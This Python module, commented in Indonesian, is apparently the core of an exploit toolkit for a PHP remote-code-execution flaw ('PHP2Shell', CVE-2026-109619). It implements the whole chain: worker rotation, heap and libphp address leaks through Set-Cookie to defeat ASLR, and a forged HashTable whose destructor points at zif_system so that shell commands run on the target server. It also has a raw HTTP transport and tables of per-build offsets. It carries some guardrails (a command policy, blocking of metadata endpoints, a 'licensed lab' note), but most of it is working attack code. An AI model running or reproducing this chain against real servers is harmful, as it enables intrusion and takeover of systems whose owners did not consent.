#!/usr/bin/env python3
"""
lib/chain.py — mesin rantai eksploitasi CVE-2026-109619.

ATRIBUSI (WAJIB DIBACA — lihat ATTRIBUTION.md):
  CVE-2026-109618 / CVE-2026-109619 ("PHP2Shell") ditemukan pertama oleh
  Calif (Ryan A.) pada 1 Agustus 2026 dan dilaporkan ke PHP 11 Agustus
  2026. Wiz Research menemukannya secara independen (19 Agustus, lapor
  24 Agustus) — wiz.io/blog/php2shell-php-rce. OpenAI Codex Security
  melaporkan vektor tambahan 18 September. Ketiganya dikreditkan di
  advisori PHP. Riset mereka adalah dasar dari semua yang ada di file ini.
  Teknik rantai di file ini BUKAN karya kami. Ini port dari riset publik
  9bie (Qi Deng) — github.com/9bie/php2shell-bypass-aslr-exp — yang
  mempublikasikan exploit.py untuk CVE-2026-109619 (2-request
  session.upload_progress UAF + ASLR bypass via heap/libphp leak +
  aktuator pDestructor = zif_system). Upstream TIDAK mempublikasikan file
  lisensi; hak cipta default berlaku pada bagian yang merupakan port.
  Lisensi GPL-3.0 repo ini mencakup kode asli kami (orkestrasi, pagar,
  proof-reader, transport), tidak mengklaim ulang karya upstream.
  Verifikator crash CVE-2026-109618: ikow/php2shell-poc
  (poc/verify_oom_trigger.py) — dirujuk, tidak di-vendor.

INI BAGIAN INTI toolkit. Tidak memanggil exploit.py, tidak butuh file di luar
folder toolkit/. Semua trafik attacker berupa HTTP biasa.

PEMETAAN CVE (dikoreksi 2026-10-23, sumber: advisory primer php-src
GHSA-w8hw-w9fx-j79w = CVE-2026-109618, GHSA-6wmf-4rv5-p3rp = CVE-2026-109619):

  CVE-2026-109618 "RCE via OOM corruption"
    SATU request. OOM -> longjmp() -> request shutdown membaca memori
    request yang belum terinisialisasi penuh. Konsumen = shutdown procedure.
    Tool ini TIDAK mengimplementasikan rantai ini.

  CVE-2026-109619 "RCE via stale global state"
    DUA request di worker yang sama. Producer (request 1) menerbitkan
    request-owned state, lalu fatal/OOM menggagalkannya sebelum reset.
    Heap request dibebaskan, tapi global worker masih menunjuk ke sana.
    Request 2 membaca state basi itu lewat session upload progress
    SEBELUM inisialisasi normal sempat me-reset.
    Advisory: "With mod_php, both the producing operation and fatal error
    can occur during multipart startup." <- persis desain rantai di bawah.
    INILAH yang diimplementasikan tool ini.

Rantai 3 tahap (109619):
  stage 0  rotasi worker lewat HTTP (abort -> prefork fork worker baru)
  stage 1  Set-Cookie heap leak   -> Zend MM chunk base
  stage 2  Set-Cookie libphp leak -> libphp base (lewat ZVAL_PTR_DTOR)
  stage 3  upload_progress fake-ref -> pDestructor = zif_system -> cmd

Syarat di target:
  display_errors=1, memory_limit kecil (<=32M), max_input_vars besar,
  max_file_uploads besar, session.use_cookies=1, session.use_strict_mode=0,
  session.use_only_cookies=0, session.upload_progress.enabled=1,
  prefork satu worker.
"""

from __future__ import annotations

import re
import socket
import ssl
import struct
import threading
import time
import urllib.parse
from collections import Counter

from . import target_policy as _policy
from . import memprobe
from . import cmd_policy

# --------------------------------------------------------------- konstanta --

MAX_CMD = 14  # carrier zend_string 167 byte -> maksimum perintah

# --- offset relatif, tidak terpengaruh ASLR --------------------------------
# Lab build: PHP 8.4.26, Apache 2.4.68, Debian 12, gcc 12.
ZIF_OFFSET = 0x43A870     # zif_system
DTOR_OFFSET = 0x613C50    # ZVAL_PTR_DTOR (zval_ptr_dtor)
HTDATA_OFFSET = 0x6E0D8   # string hidup 167 byte, dipakai sebagai HashTable palsu

# Kalibrasi bookworm: image resmi php:8.4.26-apache (Apache 2.4.69)
BOOKWORM_STAGE1_N = 841
BOOKWORM_STAGE2_T = 406
BOOKWORM_STAGE2_V = 16
BOOKWORM_HTDATA_OFFSET = 0x690D8
BOOKWORM_STAGE3_PADS = [(31, 31)] * 6

# Profil bawaan; bisa ditimpa --zif-offset / --dtor-offset / --htdata-offset
PROFILES = {
    "lab": {
        "zif": ZIF_OFFSET,
        "dtor": DTOR_OFFSET,
        "htdata": HTDATA_OFFSET,
        "stage1_n": 892,
        "stage2_t": 443,
        "stage2_v": 1,
        "stage3_pads": [(8, 7)] + [(7, 7)] * 5,
        "stage3_carrier": False,
        "cve": "CVE-2026-109619",
        "verified": True,
    },
    "bookworm": {
        "zif": 0x465370,
        "dtor": 0x65EB60,
        "htdata": BOOKWORM_HTDATA_OFFSET,
        "stage1_n": BOOKWORM_STAGE1_N,
        "stage2_t": BOOKWORM_STAGE2_T,
        "stage2_v": BOOKWORM_STAGE2_V,
        "stage3_pads": list(BOOKWORM_STAGE3_PADS),
        "stage3_carrier": True,
        "cve": "CVE-2026-109619",
        "verified": True,
    },
}

# CVE-2026-109618: primitif crash-nya SAMA (multipart + OOM), tapi rantainya
# BEDA dan TIDAK diimplementasikan tool ini — konsumennya request shutdown
# procedure dalam SATU request, bukan consumer lintas-request.
# Bukti crash 109618 di lab memakai verifikator asli ikow/php2shell-poc
# (verify_oom_trigger.py), lihat laporan uji docker.
#
# Catatan data yang wajib dibaca sebelum memakai profil di bawah:
#   - Rantai 3-tahap tool ini MENARGETKAN 109619 (producer→fatal→stale state→
#     consumer upload_progress di worker sama) — sesuai advisory
#     GHSA-6wmf-4rv5-p3rp: "both the producing operation and fatal error can
#     occur during multipart startup" (mod_php).
#   - RCE end-to-end BELUM terbukti di mesin hidup dengan tool ini
#     (HEAP_LEAK_FAILED di lab prefork multi-worker). Grooming masih turunan
#     pembacaan source, bukan hasil kalibrasi eksekusi sukses.
#   - Gunakan hanya di lab berizin. verified=True berarti offset terverifikasi
#     dari binari, BUKAN klaim RCE.
SUPPORTED_109619 = True
# (PROFILES_109619 lama digabung ke PROFILES setelah koreksi label: rantai
# 3-tahap ini SATU-SATUNYA rantai yang diimplementasikan, dan menargetkan
# 109619. Tabel terpisah tidak lagi relevan.)

SID = b"attacksessionid0001"
DEFAULT_CMD = "id>/out/p1"

# Lantai timeout untuk satu operasi jaringan. Deadline 5 ms yang tersisa tidak
# berguna (TCP handshake saja lebih lama); lebih jujur melempar DeadlineExceeded
# sebelum request dikirim. 0.1s hanya berlaku bila SISA deadline masih > 0.
MIN_OP_TIMEOUT = 0.1

# Seam jam untuk deadline. Default = time.monotonic (jam yang sama dengan yang
# dipakai lib/exploit_runner.py: `Target.deadline` adalah nilai absolut di jam
# itu). Tes mengganti nama modul ini supaya deadline bisa diuji tanpa sleep.
_clock = time.monotonic


# ---------------------------------------------------------------- payloads --

def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    """Susun body multipart/form-data dari daftar {name, data, filename?}."""
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


# ------------------------------------------------------------------ target --

class DeadlineExceeded(RuntimeError):
    """Batas waktu absolut habis sebelum operasi jaringan dikirim.

    Diekspor dari chain (bukan hanya exploit_runner) karena di sinilah deadline
    ditegakkan: `Target.op_timeout()` melempar ini saat sisa waktu <= 0, alih-alih
    mengirim request dengan timeout 90s yang membuat run melewati batas total.
    """

    def __init__(self, what: str, remaining: float | None = None):
        self.what = what
        self.remaining = remaining
        tail = "" if remaining is None else f" (sisa {remaining:.2f}s)"
        super().__init__(
            f"batas waktu total tercapai sebelum {what}{tail}; "
            "tidak ada request baru dikirim ke target")


class Target:
    """Koneksi TCP/TLS mentah supaya bentuk request sama persis dengan PoC.

    Tidak memakai curl_cffi: rantai ini butuh kontrol byte-level (kirim body
    bertahap, baca bersamaan dengan upload, biarkan worker abort di tengah).

    Deadline (`deadline`) adalah waktu ABSOLUT di jam `chain._clock`
    (time.monotonic). Bila ada, SEMUA operasi jaringan (connect, send, recv,
    jeda) dibatasi sisa waktunya — satu batas untuk seluruh rantai, bukan
    timeout per-operasi yang bisa dijumlahkan melewati anggaran total.
    `deadline=None` (default) = perilaku lama, tanpa batas total.
    """

    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True,
                 verify_tls: bool = True, deadline: float | None = None,
                 allow_private: bool = True):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL harus http:// atau https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        # Query string DULU dibuang di sini: Target(".../upload.php?route=debug")
        # terkirim sebagai "POST /upload.php" — parameter aplikasi (route,
        # action, dst.) hilang, sehingga stage 1/2/3 menembak handler yang
        # berbeda dari yang dimaksud operator dan gagal tanpa sebab jelas.
        self.query = u.query
        self.request_target = self.path + ("?" + self.query if self.query else "")
        self.timeout = timeout
        self.verbose = verbose
        # Verifikasi TLS AKTIF secara default. Target dengan CA store tak
        # lengkap (umum pada server pemerintah/kampus) membutuhkannya
        # dimatikan secara EKSPLISIT, bukan sebaliknya.
        self.verify_tls = verify_tls
        # None = tanpa batas total (kompatibel dengan pemanggil lama).
        self.deadline = deadline
        # Rantai (`Chain`) menembak target yang DIKETIK operator (lab lokal
        # 127.0.0.1/10.x lebih sering daripada host publik), jadi alamat privat
        # diizinkan di sini seperti sebelumnya — TETAPI endpoint metadata
        # cloud/IMDS tetap ditolak tanpa syarat oleh `resolve_pinned()`, walau
        # nilainya True. Yang dikunci di `_connect()` adalah PIN: satu
        # resolusi, lalu sambung ke IP hasil validasi itu.
        self.allow_private = bool(allow_private)

    # ---------- deadline ----------

    def remaining(self) -> float | None:
        """Sisa waktu ke deadline (detik), atau None bila tanpa deadline."""
        if self.deadline is None:
            return None
        return self.deadline - _clock()

    def op_timeout(self, prefer: float) -> float:
        """Timeout untuk SATU operasi jaringan berikutnya.

        Tanpa deadline: `prefer` apa adanya (perilaku lama, mis. 90s untuk
        POST stage yang body-nya besar). Dengan deadline: `min(prefer, sisa)`,
        dengan lantai `MIN_OP_TIMEOUT` — supaya socket tidak diberi timeout 0
        (mode non-blocking di Python).

        Sisa <= 0 → DeadlineExceeded. Sengaja MELEMPAR, bukan mengembalikan
        0.1: mengirim request yang pasti habis di tengah jalan menghasilkan
        laporan \"stage gagal\" yang menyesatkan, padahal payload tidak pernah
        selesai dikirim.
        """
        left = self.remaining()
        if left is None:
            return float(prefer)
        if left <= 0:
            raise DeadlineExceeded("operasi jaringan", left)
        return max(min(float(prefer), left), MIN_OP_TIMEOUT)

    @property
    def host_header(self) -> str:
        """Nilai header `Host:` — IPv6 literal wajib dibungkus bracket.

        `urlsplit` membuang bracket dari `u.hostname`, jadi tanpa pembungkusan
        ulang `[::1]:8443` menjadi `::1:8443` yang bukan host:port valid.
        """
        host = f"[{self.host}]" if ":" in self.host else self.host
        return f"{host}:{self.port}"

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def _connect(self):
        last = None
        # Pin DNS dihitung SEKALI untuk seluruh percobaan: kalau tiap retry
        # me-resolve lagi, jawaban DNS bisa berubah di tengah retry (persis
        # celah yang ditutup) dan biaya DNS berlipat 10x.
        pinned_ip: str | None = None
        for _ in range(10):
            # Tiap percobaan koneksi dibatasi SISA deadline: 10 percobaan ×
            # timeout 90s = 900s adalah cara paling mudah melewati anggaran
            # total tanpa satu pun pesan. Sisa habis -> berhenti melempar.
            try:
                attempt_timeout = self.op_timeout(self.timeout)
            except DeadlineExceeded as exc:
                if last is not None:
                    # Sebab nyata lebih berguna daripada deadline di sini,
                    # tapi jangan telan: deadline dicatat sebagai cause.
                    raise last from exc
                raise
            try:
                # DNS rebinding: resolve SEKALI di sini (validasi metadata +
                # privat ikut dijalankan), lalu sambung ke IP hasilnya. Tanpa
                # ini `create_connection(self.host, ...)` akan me-resolve ulang
                # nama dan bisa mendarat di alamat yang belum divalidasi.
                # `PolicyError` (ValueError) sengaja TIDAK ditangkap di sini:
                # blokir kebijakan bukan gangguan jaringan yang layak di-retry.
                # `ResolveError` turunan OSError -> ikut jalur retry biasa.
                if pinned_ip is None:
                    pinned_ip = _policy.resolve_pinned(
                        self.host, self.port, allow_private=self.allow_private
                    )
                s = socket.create_connection((pinned_ip, self.port),
                                             timeout=attempt_timeout)
                if self.https:
                    # Rantai berjalan lewat soket mentah, jadi TLS diatur di sini.
                    # Verifikasi AKTIF default (CERT_REQUIRED + check_hostname):
                    # melewati verifikasi bukan hak default sebuah tool, meski
                    # target dengan CA store tak lengkap lebih repot. Operator
                    # lab mematikannya eksplisit lewat verify_tls=False.
                    ctx = ssl.create_default_context()
                    if self.verify_tls:
                        ctx.check_hostname = True
                        ctx.verify_mode = ssl.CERT_REQUIRED
                    else:
                        # check_hostname harus dimatikan DULU: menyetel
                        # CERT_NONE saat check_hostname True melempar ValueError.
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                # Jeda retry juga kena deadline: 10 × 0.3s bukan jumlah besar,
                # tapi prinsipnya sama — tidak ada tunggu tanpa anggaran.
                left = self.remaining()
                if left is not None and left <= 0:
                    raise DeadlineExceeded("koneksi ke target", left) from e
                time.sleep(0.3 if left is None else min(0.3, left))
        raise last  # type: ignore[misc]

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.request_target} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        # Timeout dasar operasi ini = min(prefer, sisa deadline). Dipakai ulang
        # per potongan body supaya satu upload 16 MB tidak bisa berjalan 64×
        # lebih lama dari anggaran (sendall per 256 KB masing-masing timeout
        # penuh). Sisa habis -> DeadlineExceeded, bukan kirim lalu gagal.
        base = timeout or self.timeout
        eff = self.op_timeout(base)
        s = self._connect()
        s.settimeout(eff)

        # Baca BERBARENGAN dengan upload: sebagian request membuat worker abort
        # tepat setelah mengirim Set-Cookie; recv() yang baru mulai setelah RST
        # kehilangan respons yang sudah ter-buffer.
        data = bytearray()

        def _reader() -> None:
            try:
                while len(data) < read_cap:
                    left = self.remaining()
                    if left is not None and left <= 0:
                        break          # deadline: berhenti membaca, jangan tunggu
                    if left is not None:
                        s.settimeout(max(min(eff, left), MIN_OP_TIMEOUT))
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    # Re-arm setiap potongan: timeout per-sendall yang tidak
                    # diperbarui adalah celah yang membuat run melewati
                    # max_total_timeout walau tiap operasi "punya timeout".
                    s.settimeout(self.op_timeout(eff))
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass  # worker boleh abort saat body masih dikirim
            left = self.remaining()
            join_s = (eff + 1.0) if left is None else max(min(eff + 1.0, left), 0.0)
            reader.join(timeout=join_s)
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str | None = None,
            read_cap: int = 1 << 20) -> tuple[int, bytes]:
        """GET satu path. `path=None` memakai path+query dari URL target.

        Dulu query string URL tidak pernah ikut ke request line, sehingga
        `Target("https://h/upload.php?route=debug").get()` menembak
        `/upload.php` — handler berbeda. Path eksplisit tetap dipakai apa
        adanya (pemanggil yang menentukan).
        """
        target = self.request_target if not path else path
        hdr = (
            f"GET {target} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.op_timeout(self.timeout))
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    # Baca juga kena deadline: satu recv dibatasi sisa waktu,
                    # tapi loop-nya bisa berulang. Tanpa cek ini, GET bukti
                    # (out/p1) boleh terus membaca setelah anggaran habis.
                    left = self.remaining()
                    if left is not None and left <= 0:
                        break
                    if left is not None:
                        s.settimeout(max(min(self.timeout, left), MIN_OP_TIMEOUT))
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


# ------------------------------------------------------------ leak parsing --

def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    """Stage 1: modus pointer heap yang sejajar 2MB di dalam cookie."""
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DTOR_OFFSET) -> int:
    """Stage 2: data Set-Cookie mulai di PS(id)+0x18 = nNextFreeElement|pDestructor.

    Pemeriksaan alignment 4KB, bukan 2MB: build lab kebetulan memetakan libphp
    di batas 2MB, tapi image resmi php:8.4.26-apache di batas 4KB.
    """
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


# ------------------------------------------------------------------ chain --

class Chain:
    """Jalankan rantai penuh terhadap satu Target.

    Parameter `profile` menentukan kalibrasi grooming. `cve` hanya memilih
    profil mana yang dipakai; primitifnya sama.
    """

    def __init__(self, target: Target, cmd: str, profile: str = "bookworm",
                 cve: str = "CVE-2026-109619", zif_offset: int | None = None,
                 dtor_offset: int | None = None,
                 htdata_offset: int | None = None,
                 huge_mb: int = 12, verbose: bool = True):
        if cve == "CVE-2026-109618":
            raise NotImplementedError(
                "CVE-2026-109618 (OOM corruption, konsumen=shutdown) TIDAK "
                "diimplementasikan tool ini — rantai tool ini menargetkan "
                "CVE-2026-109619. Bukti crash 109618: verifikator asli "
                "ikow/php2shell-poc verify_oom_trigger.py."
            )
        table = PROFILES
        if profile not in table:
            raise ValueError(f"profil tidak dikenal: {profile}")

        p = table[profile]
        self.t = target
        # R2-01 (jalur API): Chain() menerima `cmd` dari pemanggil mana pun,
        # jadi bentuknya diperiksa DI SINI juga — bukan hanya di
        # exploit_runner.validate_command(). Tanpa ini,
        # `Chain(t, "sh</out/c")` melewati seluruh pagar command policy
        # (sebelumnya yang diperiksa hanya panjang <= 14 byte).
        _shape = cmd_policy.check_command_shape(cmd)
        if _shape:
            raise ValueError(_shape)
        self.cmd = cmd.encode()
        self.cve = cve
        self.profile = profile
        self.zif_offset = zif_offset if zif_offset is not None else p["zif"]
        self.dtor_offset = dtor_offset if dtor_offset is not None else p["dtor"]
        self.htdata_offset = (htdata_offset if htdata_offset is not None
                              else p["htdata"])
        # R2-03: batas keras ukuran field `big` ditegakkan DI SINI, sebelum
        # payload dibangun. argparse hanya menjaga jalur CLI; Chain() bisa
        # dipanggil langsung dari Python dengan nilai apa pun.
        self.huge_mb = memprobe.validate_huge_mb(huge_mb)
        self.verbose = verbose
        self.stage1_n = p["stage1_n"]
        self.stage2_t = p["stage2_t"]
        self.stage2_v = p["stage2_v"]
        self.stage3_pads = list(p["stage3_pads"])
        self.stage3_carrier = p["stage3_carrier"]

    # ---------- primitif request ----------

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def _pause(self, seconds: float) -> None:
        """Jeda antar-request yang IKUT anggaran deadline.

        Tanpa deadline: perilaku lama (tidur penuh). Dengan deadline: durasi
        dipotong sisa waktu, dan bila sisa sudah habis -> DeadlineExceeded.
        Kalau tidak dipotong, `rotate()` (0.3s + 0.5s) × 8 panggilan bisa
        menambah 6s melewati max_total_timeout tanpa satu pun request.
        """
        left = self.t.remaining()
        if left is None:
            time.sleep(seconds)
            return
        if left <= 0:
            raise DeadlineExceeded("jeda antar-request", left)
        time.sleep(min(seconds, left))

    def rotate(self) -> None:
        """Abort worker lewat HTTP; prefork mem-fork worker baru."""
        self.t.log("[*] rotasi worker lewat HTTP")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20,
                    timeout=self.t.op_timeout(max(90.0, self.t.timeout)))
        self._pause(0.3)
        # B tanpa file part: cleanup pre-RINIT menelusuri heap rusak -> abort
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=self.t.op_timeout(20.0))
        self._pause(0.5)

    def stage1(self) -> int:
        """Bocorkan Zend MM chunk base."""
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20,
                    timeout=self.t.op_timeout(max(90.0, self.t.timeout)))
        self._pause(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)   # zend_string len palsu
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20,
                           timeout=self.t.op_timeout(self.t.timeout))
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self) -> int:
        """Bocorkan libphp base lewat halaman HashTable 56 byte."""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20,
                    timeout=self.t.op_timeout(max(90.0, self.t.timeout)))
        self._pause(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]",
                              "data": b"x" * self.stage2_v})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20,
                           timeout=self.t.op_timeout(self.t.timeout))
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(
                f"perintah {len(cmd)} byte; carrier 167 byte hanya muat "
                f"{MAX_CMD} (mis. pakai 'sh</out/c')"
            )
        ht = bytearray(b"\x00" * 167)
        # HashTable palsu
        struct.pack_into("<II", ht, 0x00, 1, 7)                 # gc: rc=1, IS_ARRAY
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags, nTableMask
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData
        struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed/OfElements
        struct.pack_into("<II", ht, 0x20, 8, 0)                 # nTableSize/pointer
        struct.pack_into("<Q", ht, 0x28, 0)                     # nNextFreeElement
        struct.pack_into("<Q", ht, 0x30, zif)                   # pDestructor
        # execute_data palsu di E = data+0x20
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)                 # opline
        struct.pack_into("<Q", ht, E + 0x08, 0)                 # call
        struct.pack_into("<Q", ht, E + 0x10, zif)               # return_value
        struct.pack_into("<Q", ht, E + 0x18, 0)                 # func
        struct.pack_into("<Q", ht, E + 0x20, 0)                 # This.value
        struct.pack_into("<I", ht, E + 0x28, 0)                 # This.u1.type_info
        struct.pack_into("<I", ht, E + 0x2C, 1)                 # num_args = 1
        struct.pack_into("<Q", ht, E + 0x30, 0)                 # prev_execute_data
        struct.pack_into("<Q", ht, E + 0x38, 0)                 # symbol_table
        struct.pack_into("<I", ht, E + 0x40, 0)                 # call_info
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)     # arg1 value
        struct.pack_into("<I", ht, E + 0x58, 6)                 # arg1 IS_STRING
        # zend_string palsu di data+0x80
        struct.pack_into("<II", ht, 0x80, 1, 0x106)             # gc rc=1, IS_STRING
        struct.pack_into("<Q", ht, 0x88, 0)                     # h
        struct.pack_into("<Q", ht, 0x90, len(cmd))              # len
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        # reference palsu (55 byte) di R0-0x10
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)               # IS_REFERENCE
        struct.pack_into("<Q", ref, 0x18, htdata)               # val.value
        struct.pack_into("<Q", ref, 0x20, 0x307)                # IS_ARRAY_EX
        struct.pack_into("<Q", ref, 0x28, 0)                    # sources
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        """Tulis reference palsu menimpa PS(http_session_vars) lalu eksekusi."""
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(self.stage3_pads):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.profile == "bookworm":
            # Jaga PS(id) tetap valid: php_session_initialize meninggalkan
            # send_cookie=0, jadi init B tidak mengalokasikan header Set-Cookie
            # di R0+16 (yang akan menimpa val.type).
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20,
                    timeout=self.t.op_timeout(max(90.0, self.t.timeout)),
                    extra_headers=extra)
        self._pause(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            # Reference bookworm masih hidup (rc=2). zend_string bin-40 15 byte
            # menaruh chars tepat di PS(http_session_vars): pertahankan gc
            # (rc=1, IS_REFERENCE), timpa 7 byte rendah val.value dengan
            # HashTable palsu, byte tinggi tetap 0x00 (0x00007f...).
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=self.t.op_timeout(30.0))
